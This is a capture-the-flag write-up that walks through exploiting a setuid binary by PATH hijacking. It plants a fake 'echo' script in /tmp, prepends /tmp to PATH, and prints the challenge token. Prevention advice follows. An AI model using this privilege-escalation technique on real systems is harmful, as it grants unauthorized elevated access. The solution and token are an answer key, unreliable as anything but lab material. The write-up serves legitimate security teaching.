# Level 03 - PATH Environment Variable Hijacking

## 🎯 Objective
Exploit a setuid binary to execute commands as `flag03`.

## 🧠 My Thought Process

### Step 1: "There's a setuid binary here!"
```bash
ls -la
# -rwsr-sr-x 1 flag03 level03 8627 level03
```

**What does `rwsr-sr-x` mean?**
- `s` in user permission = SUID bit is set
- `s` in group permission = SGID bit is set
- When executed, this binary runs with **flag03's privileges**, not mine!

### Step 2: "What does this binary do?"
```bash
./level03
# Output: Exploit me

strings level03
# /usr/bin/env echo Exploit me
```

**Interesting!** The binary uses `/usr/bin/env echo` instead of `/bin/echo`.

### Step 3: "Why is `/usr/bin/env` dangerous here?"
The `env` command searches for programs in the **PATH environment variable**. The execution flow is:

```
level03 binary
    ↓
system("/usr/bin/env echo Exploit me")
    ↓
env searches PATH for 'echo'
    ↓
Finds /bin/echo (normally)
    ↓
Runs: /bin/echo "Exploit me"
```

**But what if I could make `env` find MY version of `echo` first?**

### Step 4: "Creating a malicious 'echo'"
I created my own `echo` that runs `getflag`:

```bash
cd /tmp
echo '#!/bin/bash' > echo
echo 'getflag' >> echo
chmod +x echo
```

### Step 5: "Hijacking the PATH"
I prepended `/tmp` to the PATH, so my `echo` is found before the real one:

```bash
export PATH=/tmp:$PATH
```

Now when `env` searches for `echo`:
1. First checks `/tmp` → Finds my malicious echo! ✓
2. Never reaches `/bin/echo`

### Step 6: "Execute the exploit"
```bash
~/level03
# Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

**It worked!** The setuid binary called my fake `echo`, which ran `getflag` with flag03's privileges!

## ✅ Solution
```bash
cd /tmp
echo '#!/bin/bash' > echo
echo 'getflag' >> echo
chmod +x echo
export PATH=/tmp:$PATH
~/level03
```

**Token:** `qi0maab88jeaj46qoumi7maus`

## 📚 Concepts to Learn

### 1. SUID/SGID Bits
| Bit | Numeric | Effect |
|-----|---------|--------|
| SUID | 4000 | Run as file owner |
| SGID | 2000 | Run as file group |
| Sticky | 1000 | Only owner can delete |

**SUID binaries are dangerous** because they run with elevated privileges regardless of who executes them.

### 2. The PATH Environment Variable
PATH tells the shell where to find executables:
```bash
echo $PATH
# /usr/local/bin:/usr/bin:/bin
```

When you type a command, the shell checks each directory in PATH order:
1. `/usr/local/bin/command` exists? → Run it
2. `/usr/bin/command` exists? → Run it
3. `/bin/command` exists? → Run it
4. None found → "command not found"

### 3. `/usr/bin/env` vs Direct Paths
```bash
# DANGEROUS - uses PATH
system("/usr/bin/env python script.py")

# SAFE - explicit path
system("/usr/bin/python script.py")
```

`env` is useful for portability (finding python wherever it's installed), but it's vulnerable to PATH manipulation.

### 4. The Attack Pattern
```
1. Create malicious script with same name as target command
2. Place it in a directory you control (/tmp)
3. Modify PATH to search your directory first
4. Execute the vulnerable SUID program
5. Your script runs with elevated privileges!
```

## 🔧 Tools Used
- `strings` - Extract readable text from binaries
- `ltrace` - Trace library calls (shows system() call)
- `echo` - Create files
- `chmod` - Make files executable
- `export` - Modify environment variables

## 🛡️ How to Prevent This
1. **Use absolute paths** in SUID programs (`/bin/echo` not `echo`)
2. **Clear/sanitize PATH** before executing commands:
   ```c
   setenv("PATH", "/bin:/usr/bin", 1);
   ```
3. **Avoid system()** - Use exec() family with full paths
4. **Minimize SUID programs** - They're inherently risky
5. **Drop privileges** as soon as they're no longer needed
